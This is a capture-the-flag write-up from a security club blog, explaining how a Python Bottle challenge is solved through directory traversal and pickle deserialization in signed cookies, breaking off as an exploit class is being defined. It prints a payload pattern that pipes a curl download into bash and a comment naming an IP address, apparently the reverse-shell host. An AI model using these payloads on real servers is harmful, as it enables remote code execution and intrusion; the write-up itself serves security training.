<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=generator content="Wowchemy 5.7.0 for Hugo"><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap" media=print onload='this.media="all"'><link rel=stylesheet href=/css/vendor-bundle.min.16f785cdb553c8c4431db6775122af35.css media=print onload='this.media="all"'><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/academicons@1.9.2/css/academicons.min.css integrity="sha512-KlJCpRsLf+KKu2VQa5vmRuClRFjxc5lXO03ixZt82HZUk41+1I0bD8KBSA0fY290ayMfWYI9udIqeOWSu1/uZg==" crossorigin=anonymous media=print onload='this.media="all"'><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/leaflet@1.7.1/dist/leaflet.min.css integrity crossorigin=anonymous media=print onload='this.media="all"'><link rel=stylesheet href=/css/wowchemy.79e51de7c4464db8eb07f9e30f7461b3.css><link rel=stylesheet href=/css/libs/chroma/igor.min.css title=hl-light media=print onload='this.media="all"'><link rel=stylesheet href=/css/libs/chroma/dracula.min.css title=hl-dark media=print onload='this.media="all"' disabled><meta name=author content="BKISC"><meta name=description content="Deserialization attack with Python Bottle."><link rel=alternate hreflang=en-us href=https://blog.bkisc.com/blog/duti/sekai-ctf-2022-bottle-poem/><link rel=canonical href=https://blog.bkisc.com/blog/duti/sekai-ctf-2022-bottle-poem/><link rel=manifest href=/manifest.webmanifest><link rel=icon type=image/png href=/media/icon_hu606891fec664e3336fdbe668a4668404_488824_32x32_fill_lanczos_center_3.png><link rel=apple-touch-icon type=image/png href=/media/icon_hu606891fec664e3336fdbe668a4668404_488824_180x180_fill_lanczos_center_3.png><meta name=theme-color content="#1565c0"><meta property="twitter:card" content="summary_large_image"><meta property="twitter:site" content="@bkisc"><meta property="twitter:creator" content="@bkisc"><meta property="twitter:image" content="https://blog.bkisc.com/blog/duti/sekai-ctf-2022-bottle-poem/featured.png"><meta property="og:site_name" content="BKISC Blogs"><meta property="og:url" content="https://blog.bkisc.com/blog/duti/sekai-ctf-2022-bottle-poem/"><meta property="og:title" content="Sekai CTF 2022 Bottle Poem | BKISC Blogs"><meta property="og:description" content="Deserialization attack with Python Bottle."><meta property="og:image" content="https://blog.bkisc.com/blog/duti/sekai-ctf-2022-bottle-poem/featured.png"><meta property="og:locale" content="en-us"><meta property="article:published_time" content="2023-01-12T00:00:00+00:00"><meta property="article:modified_time" content="2023-01-12T00:00:00+00:00"><title>Sekai CTF 2022 Bottle Poem | BKISC Blogs</title><script>MathJax={tex:{inlineMath:[["$","$"],["\\(","\\)"]],displayMath:[["$$","$$"],["\\[","\\]"]],processEscapes:!0,processEnvironments:!0},options:{skipHtmlTags:["script","noscript","style","textarea","pre","flag"]}},window.addEventListener("load",e=>{document.querySelectorAll("mjx-container").forEach(function(e){e.parentElement.classList+="has-jax"})})</script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script></head><body id=top data-spy=scroll data-offset=70 data-target=#TableOfContents class=page-wrapper data-wc-page-id=2256b16fb9515e2dc5aa0a85914de4e5><script src=/js/wowchemy-init.min.ec9d49ca50e4b80bdb08f0417a28ed84.js></script><aside class=search-modal id=search><div class=container><section class=search-header><div class="row no-gutters justify-content-between mb-3"><div class=col-6><h1>Search</h1></div><div class="col-6 col-search-close"><a class=js-search href=# aria-label=Close><i class="fas fa-times-circle text-muted" aria-hidden=true></i></a></div></div><div id=search-box><input name=q id=search-query placeholder=Search... autocapitalize=off autocomplete=off autocorrect=off spellcheck=false type=search class=form-control aria-label=Search...></div></section><section class=section-search-results><div id=search-hits></div></section></div></aside><div class="page-header header--fixed"><header><nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id=navbar-main><div class=container-xl><div class="d-none d-lg-inline-flex"><a class=navbar-brand href=/><img src=/media/logo_huc55a0313517dd04bda48a4ace4db28bc_511389_0x70_resize_lanczos_3.png alt="BKISC Blogs"></a></div><button type=button class=navbar-toggler data-toggle=collapse data-target=#navbar-content aria-controls=navbar-content aria-expanded=false aria-label="Toggle navigation">
<span><i class="fas fa-bars"></i></span></button><div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none"><a class=navbar-brand href=/><img src=/media/logo_huc55a0313517dd04bda48a4ace4db28bc_511389_0x70_resize_lanczos_3.png alt="BKISC Blogs"></a></div><div class="navbar-collapse main-menu-item collapse justify-content-center" id=navbar-content><ul class="navbar-nav d-md-inline-flex"><li class=nav-item><a class=nav-link href=/><span>Home</span></a></li><li class=nav-item><a class=nav-link href=/introduction><span>Introduction</span></a></li><li class=nav-item><a class=nav-link href=/post><span>News</span></a></li><li class=nav-item><a class=nav-link href=/event><span>Events</span></a></li><li class=nav-item><a class="nav-link active" href=/blog><span>Blogs</span></a></li><li class=nav-item><a class=nav-link href=/members><span>Members</span></a></li><li class=nav-item><a class=nav-link href=/contact><span>Contact</span></a></li></ul></div><ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2"><li class=nav-item><a class="nav-link js-search" href=# aria-label=Search><i class="fas fa-search" aria-hidden=true></i></a></li><li class="nav-item dropdown theme-dropdown"><a href=# class=nav-link data-toggle=dropdown aria-haspopup=true aria-label="Display preferences"><i class="fas fa-moon" aria-hidden=true></i></a><div class=dropdown-menu><a href=# class="dropdown-item js-set-theme-light"><span>Light</span></a>
<a href=# class="dropdown-item js-set-theme-dark"><span>Dark</span></a>
<a href=# class="dropdown-item js-set-theme-auto"><span>Automatic</span></a></div></li></ul></div></nav></header></div><div class=page-body><article class=article><div class="article-container pt-3"><h1>Sekai CTF 2022 Bottle Poem</h1><div class=article-metadata><div><span><a href=/author/hdthinh1012/>hdthinh1012</a></span></div><span class=article-date>Jan 12, 2023</span></div></div><div class="article-header article-container featured-image-wrapper mt-4 mb-4" style=max-width:720px;max-height:720px><div style=position:relative><img src=/blog/duti/sekai-ctf-2022-bottle-poem/featured_huc5df2d5f6799149cd098e3e1b62cf52d_83532_720x2500_fit_q75_h2_lanczos_3.webp width=720 height=720 alt class=featured-image>
<span class=article-header-caption>Image credit: <a href=https://ctftime.org/team/169557/ target=_blank rel=noopener><strong>Project Sekai</strong></a></span></div></div><div class=article-container><div class=article-style><p><ul class=tags-list><a href=https://blog.bkisc.com/tag/ctf/>ctf</a>
<a href=https://blog.bkisc.com/tag/writeup/>writeup</a>
<a href=https://blog.bkisc.com/tag/web-exploitation/>web-exploitation</a></ul><details class="toc-inpage d-print-none" open><summary class=font-weight-bold>Table of Contents</summary><nav id=TableOfContents><ul><li><a href=#problem-statement>Problem statement</a></li><li><a href=#basic>Basic</a><ul><li><a href=#python-bottle>Python Bottle</a></li><li><a href=#pickle-exploit>Pickle exploit</a></li></ul></li><li><a href=#the-exercise-step>The exercise step</a><ul><li><a href=#generate-cookie>Generate cookie</a></li></ul></li><li><a href=#reference-links>Reference Links</a></li></ul></nav></details></p><h2 id=problem-statement>Problem statement</h2><p><figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/duti/sekai-ctf-2022-bottle-poem/problem-statement_hubb36c6575665dd7b50435e435f1d00fd_110442_4a91ca17c18ee2bcef6f40a16a68a5d7.webp 400w,
/blog/duti/sekai-ctf-2022-bottle-poem/problem-statement_hubb36c6575665dd7b50435e435f1d00fd_110442_6e7d8f85bb5a3496f13d0e2fa954f40d.webp 760w,
/blog/duti/sekai-ctf-2022-bottle-poem/problem-statement_hubb36c6575665dd7b50435e435f1d00fd_110442_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/duti/sekai-ctf-2022-bottle-poem/problem-statement_hubb36c6575665dd7b50435e435f1d00fd_110442_4a91ca17c18ee2bcef6f40a16a68a5d7.webp width=760 height=271 loading=lazy data-zoomable></div></div></figure>Author hints that flag is executable</p><p><figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/duti/sekai-ctf-2022-bottle-poem/web-home_hucf17ab4f3ef68871da9bf1f003f4e98b_68536_1ac92203911ee32374b5c8cfdf92f1e3.webp 400w,
/blog/duti/sekai-ctf-2022-bottle-poem/web-home_hucf17ab4f3ef68871da9bf1f003f4e98b_68536_3db95823c489131849b41bad6f56f91c.webp 760w,
/blog/duti/sekai-ctf-2022-bottle-poem/web-home_hucf17ab4f3ef68871da9bf1f003f4e98b_68536_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/duti/sekai-ctf-2022-bottle-poem/web-home_hucf17ab4f3ef68871da9bf1f003f4e98b_68536_1ac92203911ee32374b5c8cfdf92f1e3.webp width=760 height=317 loading=lazy data-zoomable></div></div></figure><figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/duti/sekai-ctf-2022-bottle-poem/web-link_hu094cb2da42e10c6ddce99a0c70598a63_121667_367f0777060e97e8f182d318fe9db5a5.webp 400w,
/blog/duti/sekai-ctf-2022-bottle-poem/web-link_hu094cb2da42e10c6ddce99a0c70598a63_121667_ea86b6e74991cb6029b0ace1e78dfe6b.webp 760w,
/blog/duti/sekai-ctf-2022-bottle-poem/web-link_hu094cb2da42e10c6ddce99a0c70598a63_121667_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/duti/sekai-ctf-2022-bottle-poem/web-link_hu094cb2da42e10c6ddce99a0c70598a63_121667_367f0777060e97e8f182d318fe9db5a5.webp width=760 height=317 loading=lazy data-zoomable></div></div></figure></p><p>The website is vulnerable to directory traversal<figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/duti/sekai-ctf-2022-bottle-poem/web-link-directory-traversal_hu806de846b507f5d4b062d7fb880deb41_223805_fc0c13ac486926b237705909fb5674c9.webp 400w,
/blog/duti/sekai-ctf-2022-bottle-poem/web-link-directory-traversal_hu806de846b507f5d4b062d7fb880deb41_223805_f6f697f8a4c4f331ede31d4ada1d842d.webp 760w,
/blog/duti/sekai-ctf-2022-bottle-poem/web-link-directory-traversal_hu806de846b507f5d4b062d7fb880deb41_223805_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/duti/sekai-ctf-2022-bottle-poem/web-link-directory-traversal_hu806de846b507f5d4b062d7fb880deb41_223805_fc0c13ac486926b237705909fb5674c9.webp width=760 height=317 loading=lazy data-zoomable></div></div></figure></p><p>Pick /etc/self/procline to get the start application command<figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/duti/sekai-ctf-2022-bottle-poem/directory-traveral-cmd-procline_hu9a9e03d49b5159300bc336cf8757ad35_275308_3b5b0446a4ac798eff2f398ab9afa3f0.webp 400w,
/blog/duti/sekai-ctf-2022-bottle-poem/directory-traveral-cmd-procline_hu9a9e03d49b5159300bc336cf8757ad35_275308_28ca4e36b8cfd5f0f62981ba13e29fa6.webp 760w,
/blog/duti/sekai-ctf-2022-bottle-poem/directory-traveral-cmd-procline_hu9a9e03d49b5159300bc336cf8757ad35_275308_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/duti/sekai-ctf-2022-bottle-poem/directory-traveral-cmd-procline_hu9a9e03d49b5159300bc336cf8757ad35_275308_3b5b0446a4ac798eff2f398ab9afa3f0.webp width=760 height=317 loading=lazy data-zoomable></div></div></figure><figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_ecff5ad60b35485410da20615cf92a95.webp 400w,
/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_0d72305cb6524bd08f21aba767f58f28.webp 760w,
/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_ecff5ad60b35485410da20615cf92a95.webp width=760 height=89 loading=lazy data-zoomable></div></div></figure></p><p>So the application source is located at /app/app.py<figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_ecff5ad60b35485410da20615cf92a95.webp 400w,
/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_0d72305cb6524bd08f21aba767f58f28.webp 760w,
/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/duti/sekai-ctf-2022-bottle-poem/self-procline_hu5b1ff968481bcd6b20cbe9c421f572db_31755_ecff5ad60b35485410da20615cf92a95.webp width=760 height=89 loading=lazy data-zoomable></div></div></figure><figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/duti/sekai-ctf-2022-bottle-poem/app-source_hua054e672ef06a5fc1f5b3be2a3baec28_89890_16ad39f60335557edc36537a3cac697b.webp 400w,
/blog/duti/sekai-ctf-2022-bottle-poem/app-source_hua054e672ef06a5fc1f5b3be2a3baec28_89890_e688dff2097a57abe2efb1bf3dc20dad.webp 760w,
/blog/duti/sekai-ctf-2022-bottle-poem/app-source_hua054e672ef06a5fc1f5b3be2a3baec28_89890_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/duti/sekai-ctf-2022-bottle-poem/app-source_hua054e672ef06a5fc1f5b3be2a3baec28_89890_16ad39f60335557edc36537a3cac697b.webp width=760 height=234 loading=lazy data-zoomable></div></div></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>bottle</span> <span class=kn>import</span> <span class=n>route</span><span class=p>,</span> <span class=n>run</span><span class=p>,</span> <span class=n>template</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>response</span><span class=p>,</span> <span class=n>error</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>config.secret</span> <span class=kn>import</span> <span class=n>sekai</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@route</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>home</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>template</span><span class=p>(</span><span class=s2>&#34;index&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@route</span><span class=p>(</span><span class=s2>&#34;/show&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span><span class=o>.</span><span class=n>content_type</span> <span class=o>=</span> <span class=s2>&#34;text/plain; charset=UTF-8&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>param</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>query</span><span class=o>.</span><span class=n>id</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s2>&#34;^../app&#34;</span><span class=p>,</span> <span class=n>param</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;No!!!!&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>requested_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>getcwd</span><span class=p>()</span> <span class=o>+</span> <span class=s2>&#34;/poems&#34;</span><span class=p>,</span> <span class=n>param</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>requested_path</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tfile</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;No This Poems&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>tfile</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@error</span><span class=p>(</span><span class=mi>404</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>error404</span><span class=p>(</span><span class=n>error</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>template</span><span class=p>(</span><span class=s2>&#34;error&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@route</span><span class=p>(</span><span class=s2>&#34;/sign&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>session</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>get_cookie</span><span class=p>(</span><span class=s2>&#34;name&#34;</span><span class=p>,</span> <span class=n>secret</span><span class=o>=</span><span class=n>sekai</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>session</span> <span class=ow>or</span> <span class=n>session</span><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;guest&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>session</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;guest&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=n>response</span><span class=o>.</span><span class=n>set_cookie</span><span class=p>(</span><span class=s2>&#34;name&#34;</span><span class=p>,</span> <span class=n>session</span><span class=p>,</span> <span class=n>secret</span><span class=o>=</span><span class=n>sekai</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>template</span><span class=p>(</span><span class=s2>&#34;guest&#34;</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=n>session</span><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>session</span><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;admin&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>template</span><span class=p>(</span><span class=s2>&#34;admin&#34;</span><span class=p>,</span> <span class=n>name</span><span class=o>=</span><span class=n>session</span><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;pls no hax&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=vm>__file__</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>8080</span><span class=p>)</span>
</span></span></code></pre></div><p>If run the code at local change the set_cookie’s session argument to {”name”:”admin”} will get the admin page but it just a trap</p><p>The hint said flag is executable, meaning RCE is possible.</p><h2 id=basic>Basic</h2><p>Let&rsquo;s have a look at Python Bottle</p><h3 id=python-bottle>Python Bottle</h3><p><figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/duti/sekai-ctf-2022-bottle-poem/bottle-guide_hua0e15899b815379d498dc7acac9b8797_235317_2da4d05bf295c508b55d3bf0008f3835.webp 400w,
/blog/duti/sekai-ctf-2022-bottle-poem/bottle-guide_hua0e15899b815379d498dc7acac9b8797_235317_9aede7e11bf7c26d14866bd091e5edc0.webp 760w,
/blog/duti/sekai-ctf-2022-bottle-poem/bottle-guide_hua0e15899b815379d498dc7acac9b8797_235317_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/duti/sekai-ctf-2022-bottle-poem/bottle-guide_hua0e15899b815379d498dc7acac9b8797_235317_2da4d05bf295c508b55d3bf0008f3835.webp width=760 height=673 loading=lazy data-zoomable></div></div></figure></p><h4 id=bottle-signed-cookie>Bottle signed cookie</h4><p><figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/duti/sekai-ctf-2022-bottle-poem/bottle-signed-step_hu0cd8d755df6863a65683222e34093b5c_95023_a8f693444e40046bd1eee2826e10647d.webp 400w,
/blog/duti/sekai-ctf-2022-bottle-poem/bottle-signed-step_hu0cd8d755df6863a65683222e34093b5c_95023_ead85bc611860f2da16d91ae787d9285.webp 760w,
/blog/duti/sekai-ctf-2022-bottle-poem/bottle-signed-step_hu0cd8d755df6863a65683222e34093b5c_95023_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/duti/sekai-ctf-2022-bottle-poem/bottle-signed-step_hu0cd8d755df6863a65683222e34093b5c_95023_a8f693444e40046bd1eee2826e10647d.webp width=760 height=418 loading=lazy data-zoomable></div></div></figure>Bottle first:</p><ul><li>pickle.dumps([name, value], -1) then base64 encode → encoded</li><li>hmac encrypt the secret seperately then base64 encode → signature</li><li>add ‘!’ at the first char and ‘?’ in between signature</li></ul><p>Cookie format: !<strong>secret_hmac_base64</strong>==?<strong>pickle_name_value_base64</strong>==</p><h4 id=bottle-verify-cookie>Bottle verify cookie</h4><p><figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/duti/sekai-ctf-2022-bottle-poem/bottle-verify-step_hubbe8808ca1647ce036722730ad0cedd3_112464_5dfcde79c797c3caa19c73b2b095daa5.webp 400w,
/blog/duti/sekai-ctf-2022-bottle-poem/bottle-verify-step_hubbe8808ca1647ce036722730ad0cedd3_112464_50867633a80be09520027d09a77e6a09.webp 760w,
/blog/duti/sekai-ctf-2022-bottle-poem/bottle-verify-step_hubbe8808ca1647ce036722730ad0cedd3_112464_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/duti/sekai-ctf-2022-bottle-poem/bottle-verify-step_hubbe8808ca1647ce036722730ad0cedd3_112464_5dfcde79c797c3caa19c73b2b095daa5.webp width=760 height=485 loading=lazy data-zoomable></div></div></figure>get_cookie:</p><ul><li>…</li><li>base64 decode the pickled then call pickle.loads(pickle.dumps([’name’, “Pickle dumps containing RCE here”], -1))</li></ul><p>We have controlled the value input through cookie</p><h3 id=pickle-exploit>Pickle exploit</h3><p><a href=https://davidhamann.de/2020/04/05/exploiting-python-pickle/ target=_blank rel=noopener>Ref</a>
Byte-stream created by pickle.dumps contains opcodes that are then one-by-one executed as soon as we load the pickle back in. If you are curious how the instructions in this pickle look like, you can use pickletools to create a disassembly: pickletools.dis(pickled)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=n>pickled</span> <span class=o>=</span> <span class=n>pickle</span><span class=o>.</span><span class=n>dumps</span><span class=p>([</span><span class=s1>&#39;pickle&#39;</span><span class=p>,</span> <span class=s1>&#39;me&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>3</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=kn>import</span> <span class=nn>pickletools</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=n>pickletools</span><span class=o>.</span><span class=n>dis</span><span class=p>(</span><span class=n>pickled</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>:</span> \<span class=n>x80</span> <span class=n>PROTO</span>      <span class=mi>4</span>
</span></span><span class=line><span class=cl>    <span class=mi>2</span><span class=p>:</span> \<span class=n>x95</span> <span class=n>FRAME</span>      <span class=mi>25</span>
</span></span><span class=line><span class=cl>   <span class=mi>11</span><span class=p>:</span> <span class=p>]</span>    <span class=n>EMPTY_LIST</span>
</span></span><span class=line><span class=cl>   <span class=mi>12</span><span class=p>:</span> \<span class=n>x94</span> <span class=n>MEMOIZE</span>    <span class=p>(</span><span class=k>as</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=mi>13</span><span class=p>:</span> <span class=p>(</span>    <span class=n>MARK</span>
</span></span><span class=line><span class=cl>   <span class=mi>14</span><span class=p>:</span> \<span class=n>x8c</span>     <span class=n>SHORT_BINUNICODE</span> <span class=s1>&#39;pickle&#39;</span>
</span></span><span class=line><span class=cl>   <span class=mi>22</span><span class=p>:</span> \<span class=n>x94</span>     <span class=n>MEMOIZE</span>    <span class=p>(</span><span class=k>as</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=mi>23</span><span class=p>:</span> \<span class=n>x8c</span>     <span class=n>SHORT_BINUNICODE</span> <span class=s1>&#39;me&#39;</span>
</span></span><span class=line><span class=cl>   <span class=mi>27</span><span class=p>:</span> \<span class=n>x94</span>     <span class=n>MEMOIZE</span>    <span class=p>(</span><span class=k>as</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=mi>28</span><span class=p>:</span> <span class=n>K</span>        <span class=n>BININT1</span>    <span class=mi>1</span>
</span></span><span class=line><span class=cl>   <span class=mi>30</span><span class=p>:</span> <span class=n>K</span>        <span class=n>BININT1</span>    <span class=mi>2</span>
</span></span><span class=line><span class=cl>   <span class=mi>32</span><span class=p>:</span> <span class=n>K</span>        <span class=n>BININT1</span>    <span class=mi>3</span>
</span></span><span class=line><span class=cl>   <span class=mi>34</span><span class=p>:</span> <span class=n>e</span>        <span class=n>APPENDS</span>    <span class=p>(</span><span class=n>MARK</span> <span class=n>at</span> <span class=mi>13</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=mi>35</span><span class=p>:</span> <span class=o>.</span>    <span class=n>STOP</span>
</span></span></code></pre></div><p>pickle still allows you to define a custom behavior for the pickling process for your class instances.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>The __reduce__() method takes no argument and shall return either a string or 
</span></span><span class=line><span class=cl>preferably a tuple (the returned object is often referred to as the “reduce value”). 
</span></span><span class=line><span class=cl>[…] When a tuple is returned, it must be between two and six items long. 
</span></span><span class=line><span class=cl>Optional items can either be omitted, or None can be provided as their value. 
</span></span><span class=line><span class=cl>The semantics of each item are in order:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>A callable object that will be called to create the initial version of the object.
</span></span><span class=line><span class=cl>A tuple of arguments for the callable object. An empty tuple must be given if the 
</span></span><span class=line><span class=cl>callable does not accept any argument. […]
</span></span></code></pre></div><p>So by implementing <code>__reduce__</code> in a class which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run. While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed.</p><p>So if any value in the array pass into pickle.dumps is an instance containing <code>__reduce__</code>(…) function, that reduce will be executed when calling pickle.loads(…). And the <code>__reduce__</code>(…) implement demand returns an tuple with first value an executable, callable method in python for example (os.system, eval or any function), the second value is argument of the callable.</p><p>So by implement reduce method that <code>return (eval, ('__import__("os").popen("curl xxx|bash")',))</code> , we can execute code on the server.</p><h2 id=the-exercise-step>The exercise step</h2><h3 id=generate-cookie>Generate cookie</h3><p>Add an class definition with <code>__reduce__</code> method (that return reverse shell python code) to create an instance, then pass the instance to the session1[’name’] that passed into set_cookie.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>class</span> <span class=nc>RCE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>__reduce__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># 14.186.174.164</span>
